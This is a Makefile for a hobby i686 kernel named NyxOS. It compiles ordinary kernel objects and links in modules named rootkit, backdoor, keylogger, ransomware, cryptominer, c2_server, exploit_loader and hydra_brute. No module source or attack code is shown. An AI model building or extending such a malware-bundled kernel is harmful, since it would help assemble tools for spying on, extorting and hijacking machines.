# ============================================================
# kernel/Makefile - Compilación del kernel NyxOS v1.0.1 (sin DOOM)
# ============================================================

TARGET = i686-elf
CC = $(TARGET)-gcc
AS = nasm
LD = $(TARGET)-ld

CFLAGS = -std=gnu99 -ffreestanding -Os -Wall -Wextra \
         -nostdlib -nostartfiles -nodefaultlibs \
         -fno-stack-protector -fno-pie -m32 \
         -ffunction-sections -fdata-sections \
         -I. -I../modules

ASFLAGS = -f elf32

LDFLAGS = -T linker.ld -nostdlib -m elf_i386

OBJS = boot.o kernel.o gdt.o gdt_flush.o idt.o idt_load.o isr.o isr_stubs.o irq.o \
       memory.o heap.o process.o syscall.o vfs.o ext2.o net.o udp.o \
       ip.o arp.o ethernet.o rtl8139.o icmp.o crypto.o anon.o timer.o keyboard.o screen.o \
       serial.o umoddi3.o paging.o switch.o

MODULE_OBJS = ../modules/rootkit.o ../modules/backdoor.o \
              ../modules/keylogger.o ../modules/injector.o \
              ../modules/scanner.o ../modules/reaver.o \
              ../modules/exploit_loader.o ../modules/hydra_brute.o \
              ../modules/c2_server.o ../modules/ransomware.o \
              ../modules/cryptominer.o

all: nyx-kernel.bin

nyx-kernel.bin: $(OBJS) $(MODULE_OBJS)
	$(LD) $(LDFLAGS) -o $@ $^

../modules/%.o: ../modules/%.c
	$(CC) $(CFLAGS) -c $< -o $@

%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

%.o: %.asm
	$(AS) $(ASFLAGS) $< -o $@

clean:
	rm -f *.o *.bin
	rm -f ../modules/*.o